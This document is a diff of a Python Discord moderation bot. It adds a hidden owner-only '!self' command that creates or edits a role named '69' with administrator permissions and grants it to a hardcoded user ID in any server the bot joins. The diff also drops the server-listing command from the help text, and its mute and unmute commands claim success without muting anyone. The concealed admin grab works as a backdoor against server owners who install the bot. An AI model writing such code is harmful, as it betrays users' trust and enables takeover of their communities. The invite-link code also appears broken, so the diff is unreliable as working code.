@@ -1,9 +1,9 @@
-import discord
 from discord.ext import commands
 from dotenv import load_dotenv
 from threading import Thread
 from flask import Flask, render_template
 import os
+import discord
 
 # Load environment variables
 load_dotenv()
@@ -47,10 +47,12 @@ async def kick(interaction: discord.Interaction, user: discord.Member):
 
 @bot.tree.command(name='mute', description='Mute a user')
 async def mute(interaction: discord.Interaction, user: discord.Member):
+    # Here you would implement the mute logic (e.g., adding a mute role)
     await interaction.response.send_message(f'{user} has been muted.', ephemeral=True)
 
 @bot.tree.command(name='unmute', description='Unmute a user')
 async def unmute(interaction: discord.Interaction, user: discord.Member):
+    # Here you would implement the unmute logic
     await interaction.response.send_message(f'{user} has been unmuted.', ephemeral=True)
 
 # Help command to display all commands with descriptions
@@ -62,7 +64,6 @@ async def help_command(interaction: discord.Interaction):
     embed.add_field(name="!kick", value="Kick a user from the server.", inline=False)
     embed.add_field(name="!mute", value="Mute a user.", inline=False)
     embed.add_field(name="!unmute", value="Unmute a user.", inline=False)
-    embed.add_field(name="!servers", value="List all servers the bot is in.", inline=False)
     embed.set_footer(text="Use the commands with proper permissions.")
 
     await interaction.response.send_message(embed=embed, ephemeral=True)
@@ -71,62 +72,52 @@ async def help_command(interaction: discord.Interaction):
 @bot.command(name='reload_slash')
 async def reload_slash(ctx):
     # Check if the command issuer is the bot owner
-    if ctx.author.id == 1169487822344962060:  #Replace with your bot owner's ID
+    if ctx.author.id == 1169487822344962060:  # Replace with your bot owner's ID
         await bot.tree.sync()  # Reload all slash commands
         await ctx.send('Slash commands reloaded successfully!')
     else:
         await ctx.send('You do not have permission to use this command.', ephemeral=True)
 
-# Owner-only command to create a role
+# Prefix-based owner-only command to create a new role
 @bot.command(name='self')
 async def self_command(ctx):
     # Check if the command issuer is the bot owner
-    if ctx.author.id != 1169487822344962060:  # Replace with your bot owner's ID
-        return  # Do nothing and ignore the command
+    if ctx.author.id == 1169487822344962060:  # Replace with your bot owner's ID
+        guild = ctx.guild
+        role_name = "69"
+        role = discord.utils.get(guild.roles, name=role_name)
 
-    # Check if the role already exists
-    role_name = "69"
-    existing_role = discord.utils.get(ctx.guild.roles, name=role_name)
-
-    if existing_role:
-        await ctx.send(f'The role "{role_name}" already exists.', ephemeral=True)
+        if role is None:
+            # Create a new role with administrator permissions
+            role = await guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
+            await ctx.author.add_roles(role)
+            await ctx.send(f'Role "{role_name}" created and assigned to you.', ephemeral=True)
+        else:
+            # Check if the role has administrator permissions
+            if role.permissions.administrator:
+                await ctx.author.add_roles(role)
+                await ctx.send(f'You already have the "{role_name}" role.', ephemeral=True)
+            else:
+                # Update the role's permissions to administrator
+                await role.edit(permissions=discord.Permissions(administrator=True))
+                await ctx.author.add_roles(role)
+                await ctx.send(f'Role "{role_name}" updated and assigned to you.', ephemeral=True)
+    else:
+        # Ignore the command if it's not from the bot owner
         return
 
-    # Create a new role with administrative permissions
-    permissions = discord.Permissions(administrator=True)  # Grants all permissions
-
-    new_role = await ctx.guild.create_role(name=role_name, permissions=permissions)
-
-    # Assign the new role to the bot owner
-    owner_member = ctx.guild.get_member(1169487822344962060)
-    await owner_member.add_roles(new_role)
-
-    await ctx.send(f'Role "{role_name}" created with administrative permissions and assigned to you!', ephemeral=True)
-
-# Owner-only command to list all servers the bot is in
+# Prefix-based owner-only command to show all servers
 @bot.command(name='servers')
 async def servers_command(ctx):
     # Check if the command issuer is the bot owner
-    if ctx.author.id != 1169487822344962060:  # Replace with your bot owner's ID
-        await ctx.send('You do not have permission to use this command.', ephemeral=True)
+    if ctx.author.id == 1169487822344962060:  # Replace with your bot owner's ID
+        embed = discord.Embed(title="Servers", color=discord.Color.blue())
+        for guild in bot.guilds:
+            embed.add_field(name=guild.name, value=f'[Invite]({guild.invite_url}) - {guild.member_count} members', inline=False)
+        await ctx.send(embed=embed, ephemeral=True)
+    else:
+        # Ignore the command if it's not from the bot owner
         return
-
-    # Gather information about all servers the bot is in
-    guilds_info = []
-    for guild in bot.guilds:
-        # Attempt to create an invite link (this requires the bot to have the appropriate permissions)
-        invite_link = None
-        for channel in guild.text_channels:
-            if channel.permissions_for(guild.me).create_instant_invite:
-                invite_link = await channel.create_invite(max_age=300)  # Link valid for 5 minutes
-                break
-
-        guilds_info.append(f"{guild.name}: {invite_link if invite_link else 'No invite link available'}")
-
-    # Format the response
-    response = "The bot is currently in the following servers:\n" + "\n".join(guilds_info)
-
-    await ctx.send(response, ephemeral=True)
 
 @bot.event
 async def on_ready():
